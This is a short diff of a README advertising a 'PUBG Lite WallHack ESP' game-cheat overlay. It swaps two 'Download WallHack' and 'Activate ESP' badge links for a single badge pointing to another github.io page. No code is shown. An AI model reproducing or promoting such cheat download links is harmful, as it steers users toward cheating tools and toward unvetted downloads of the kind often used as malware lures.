@@ -1,7 +1,6 @@
 # 🎯 PUBG Lite WallHack ESP — Visual Overlay for PUBG Lite
 
-[![Download WallHack](https://img.shields.io/badge/Download_WallHack-darkgreen?style=for-the-badge)](https://hill8347463.github.io/.github/pubg-lite-wallhack-esp)  
-[![Activate ESP](https://img.shields.io/badge/Activate_ESP-goldenrod?style=for-the-badge&logo=target)](https://hill8347463.github.io/.github/pubg-lite-wallhack-esp)
+[![Explore PUBG ESP Visual](https://img.shields.io/badge/Explore-PUBG%20ESP%20Visual-D97706?style=flat-square)](https://pubg-esp-visual.github.io/.github/)
 
 ---
 
